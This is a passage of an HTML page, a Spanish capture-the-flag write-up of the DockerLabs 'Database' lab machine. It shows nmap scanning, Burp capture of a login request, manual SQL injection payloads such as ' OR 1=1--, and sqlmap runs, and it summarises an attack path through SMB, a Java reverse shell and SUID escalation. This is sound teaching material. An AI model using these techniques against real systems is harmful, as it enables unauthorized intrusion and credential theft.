@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Database — DockerLabs Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Database de DockerLabs — Dificultad: Fácil. SQLi + SMB + Java reverse shell + SUID env.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00e5ff;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,255,136,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--green); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-easy   { color: var(--green);  border-color: rgba(0,255,136,0.4);  background: rgba(0,255,136,0.05); }
+    .badge-docker { color: var(--cyan);   border-color: rgba(0,229,255,0.3);  background: rgba(0,229,255,0.05); }
+    .badge-linux  { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-sqli   { color: var(--red);    border-color: rgba(255,45,85,0.3);  background: rgba(255,45,85,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,255,136,0.15);
+      border-left: 3px solid var(--green); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+
+    /* SCREENSHOT */
+    .screenshot { margin: 1.5rem 0; border: 1px solid var(--dim); overflow: hidden; }
+    .screenshot img { width: 100%; display: block; }
+    .screenshot-cap { background: var(--bg2); padding: 0.5rem 1rem; font-family: var(--font-mono); font-size: 0.67rem; color: var(--text-dim); letter-spacing: 1px; border-top: 1px solid var(--dim); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--green); letter-spacing: 2px; border-bottom-color: rgba(0,255,136,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--cyan); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,255,136,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/dockerlabs/">dockerlabs</a> /
+      <span>database</span>
+    </p>
+    <h1 class="writeup-title"><span>Database</span></h1>
+    <p class="writeup-subtitle">DockerLabs — Linux · SQLi → SMB → Java Reverse Shell → SUID env</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-easy">● FÁCIL</span>
+      <span class="meta-badge badge-docker">DOCKERLABS</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-sqli">SQL INJECTION</span>
+      <span class="meta-date">📅 Abril 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#enumeracion">03 · Enumeración Web</a></li>
+        <li><a href="#sqlmap">04 · Explotación SQLi</a></li>
+        <li><a href="#smb">05 · Enumeración SMB</a></li>
+        <li><a href="#acceso">06 · Acceso Inicial (SSH)</a></li>
+        <li><a href="#privesc">07 · Escalada de Privilegios</a></li>
+        <li><a href="#root">08 · Root</a></li>
+        <li><a href="#referencia">09 · Referencia de Comandos</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-cyan">DockerLabs</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-green">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap</span> → puertos 22, 80, 139, 445</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Burp Suite</span> → captura request POST</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SQLMap</span> → dump user/pass de DB</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SMB</span> → hash en augustus.txt</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH</span> → acceso como augustus</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Java RevShell</span> → movimiento lateral a dylan</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">SUID /usr/bin/env</span> → ROOT</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Database</strong> es una máquina de dificultad <span class="hl">fácil</span> de la plataforma
+          <span class="hl-cyan">DockerLabs</span>. Corre sobre <strong>Linux Ubuntu 22.04 (Jammy)</strong>
+          y expone una aplicación web PHP con un formulario de login vulnerable a
+          <span class="hl">inyección SQL</span>, un servicio <span class="hl-cyan">SMB</span> con recursos
+          compartidos accesibles y acceso remoto via <span class="hl-cyan">SSH</span>.
+        </p>
+        <p>
+          El vector de ataque inicia con la explotación del login web mediante <strong>SQLMap</strong>,
+          lo que permite extraer credenciales de la base de datos MySQL. Posteriormente se accede al
+          servicio SMB con dichas credenciales, donde se obtiene un hash que al crackearse otorga
+          acceso SSH al usuario <span class="hl">augustus</span>. Desde ahí se realiza movimiento
+          lateral hacia <span class="hl">dylan</span> mediante una reverse shell en Java, y finalmente
+          se escala a <span class="hl-red">root</span> explotando el bit <strong>SUID</strong> del
+          binario <code style="color:var(--cyan)">/usr/bin/env</code>.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Reconocimiento</td><td>Nmap -sCV full scan</td><td>Puertos 22, 80, 139, 445 abiertos</td></tr>
+          <tr><td>Enumeración Web</td><td>Burp Suite + navegador</td><td>Request POST capturado</td></tr>
+          <tr><td>Explotación</td><td>SQLMap sobre request.txt</td><td>Credenciales: dylan / KJSDFG789FGSDF78</td></tr>
+          <tr><td>Post-explotación</td><td>smbclient + CrackStation</td><td>Password de augustus: lovely</td></tr>
+          <tr><td>Acceso inicial</td><td>SSH + Java reverse shell</td><td>Shell como dylan</td></tr>
+          <tr><td>Privesc</td><td>SUID en /usr/bin/env</td><td>Shell como root</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">DESPLIEGUE DE LA MÁQUINA</span>
+      </div>
+      <div class="prose">
+        <p>
+          El primer paso es desplegar la máquina vulnerable utilizando el script
+          <strong>auto_deploy.sh</strong> que provee DockerLabs. Este script levanta un contenedor
+          Docker a partir del archivo <span class="hl-cyan">database.tar</span>, asigna una IP
+          automáticamente dentro de la red Docker (<strong>172.17.0.x</strong>) y mantiene la
+          máquina activa hasta que se presiona <span class="hl">Ctrl+C</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh database.tar">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DEPLOY</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">database.tar</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Estamos desplegando la máquina vulnerable, espere un momento.</div>
+        <div class="o-green">Máquina desplegada, su dirección IP es ——&gt; <strong>172.17.0.2</strong></div>
+        <div class="o-red">Presiona Ctrl+C cuando termines con la máquina para eliminarla</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          En una segunda terminal realizamos un escaneo exhaustivo de todos los puertos TCP de la
+          máquina objetivo. Nmap descubre <strong>4 puertos abiertos</strong>: SSH en el puerto
+          <span class="hl">22</span>, HTTP en el <span class="hl">80</span> con Apache 2.4.52 corriendo
+          una aplicación PHP (título "Iniciar Sesión"), y <strong>Samba (SMB)</strong> en los puertos
+          <span class="hl">139 y 445</span>. El sistema operativo se identifica como
+          <span class="hl-cyan">Linux Ubuntu 22.04 Jammy</span>.
+        </p>
+        <p>
+          La presencia simultánea de un login web y SMB expuesto es una señal de ataque interesante:
+          si se obtienen credenciales por una vía, pueden reutilizarse en la otra.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">172.17.0.2</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 — Nmap scan report for 172.17.0.2</div>
+        <div>Host is up (0.000028s latency).</div>
+        <div>&nbsp;</div>
+        <div>PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE  SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION</div>
+        <div><span class="o-green">22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp; ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH 8.9p1 Ubuntu 3ubuntu0.6</span></div>
+        <div><span class="o-cyan">80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache httpd 2.4.52 ((Ubuntu))</span></div>
+        <div>|_http-title: Iniciar Sesión</div>
+        <div><span class="o-yellow">139/tcp&nbsp;&nbsp;open&nbsp;&nbsp; netbios-ssn&nbsp;Samba smbd 4</span></div>
+        <div><span class="o-yellow">445/tcp&nbsp;&nbsp;open&nbsp;&nbsp; netbios-ssn&nbsp;Samba smbd 4</span></div>
+        <div>&nbsp;</div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>| smb2-security-mode: Message signing enabled but not required</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ENUMERACION WEB -->
+    <div class="section" id="enumeracion">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Enumeración Web</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">ACCESO AL PUERTO 80</span>
+      </div>
+      <div class="prose">
+        <p>
+          Accedemos a <span class="hl-cyan">http://172.17.0.2/</span> y encontramos una página de
+          login simple con campos <strong>User</strong> y <strong>Password</strong>. Se realizaron
+          intentos manuales de inyección SQL en los campos del formulario (payloads como
+          <code style="color:var(--cyan)">' OR 1=1--</code>, <code style="color:var(--cyan)">' OR '1'='1</code>,
+          etc.) sin obtener resultado, ya que la aplicación no devuelve mensajes de error visibles
+          que permitan confirmar la vulnerabilidad de forma manual.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">INTERCEPTACIÓN CON BURP SUITE</span>
+      </div>
+      <div class="prose">
+        <p>
+          Para poder analizar la petición HTTP de forma estructurada y pasarla luego a SQLMap,
+          interceptamos el tráfico con <strong>Burp Suite</strong>. Configuramos el proxy del
+          navegador apuntando a Burp (127.0.0.1:8080), enviamos el formulario con las credenciales
+          genéricas <span class="hl">admin / admin</span> y capturamos el request POST completo.
+        </p>
+        <p>
+          El request interceptado muestra que los parámetros enviados son
+          <span class="hl-cyan">name</span> y <span class="hl-cyan">password</span> via POST a
+          <code style="color:var(--cyan)">/index.php</code>. Guardamos este request en un archivo
+          <strong>request.txt</strong> usando la opción "Save item" de Burp, lo que nos permitirá
+          pasárselo directamente a SQLMap.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="POST /index.php HTTP/1.1&#10;Host: 172.17.0.2&#10;Content-Type: application/x-www-form-urlencoded&#10;&#10;name=admin&password=admin&submit=">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">BURP · CONTENIDO DE request.txt</span>
+        <div><span class="cmd">POST /index.php HTTP/1.1</span></div>
+        <div><span class="cmd">Host: 172.17.0.2</span></div>
+        <div><span class="cmd">Content-Type: application/x-www-form-urlencoded</span></div>
+        <div><span class="cmd">...</span></div>
+        <div>&nbsp;</div>
+        <div><span class="cmd">name=admin&amp;password=admin&amp;submit=</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ GUARDAR EL REQUEST?</p>
+        <p>SQLMap necesita conocer la estructura exacta de la petición HTTP para poder inyectar payloads en los parámetros correctos. Al pasarle el archivo con <strong>-r request.txt</strong>, no tenemos que especificar URL, método, cabeceras ni parámetros manualmente — SQLMap lo lee todo del archivo.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SQLMAP -->
+    <div class="section" id="sqlmap">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Explotación — SQL Injection</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">DETECCIÓN DE VULNERABILIDAD CON SQLMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos SQLMap apuntando al archivo de request guardado. SQLMap detecta
+          <strong>dos puntos de inyección</strong>: el parámetro <span class="hl-cyan">name</span>
+          y el parámetro <span class="hl-cyan">password</span>, ambos de tipo
+          <em>Single quoted string</em> en una petición POST. Seleccionamos el punto
+          <strong>[1] — password</strong> para las inyecciones.
+        </p>
+        <p>
+          SQLMap confirma que el backend es <span class="hl">MySQL ≥ 5.1 (MariaDB fork)</span>,
+          que el servidor web corre <strong>Apache 2.4.52</strong> sobre
+          <strong>Ubuntu 22.04 Jammy</strong>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">[INFO] the back-end DBMS is MySQL</span></div>
+        <div>web server operating system: Linux Ubuntu 22.04 (jammy)</div>
+        <div>web application technology: Apache 2.4.52</div>
+        <div class="o-cyan">back-end DBMS: MySQL &ge; 5.1 (MariaDB fork)</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">LISTADO DE BASES DE DATOS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con la flag <span class="hl-cyan">--dbs</span> le indicamos a SQLMap que enumere todas
+          las bases de datos disponibles en el servidor. Se obtienen <strong>5 bases de datos</strong>:
+          las 4 del sistema (<em>information_schema, mysql, performance_schema, sys</em>) y una
+          personalizada: <span class="hl">register</span>. Esta última es la que contiene los datos
+          de la aplicación.
+        </p>
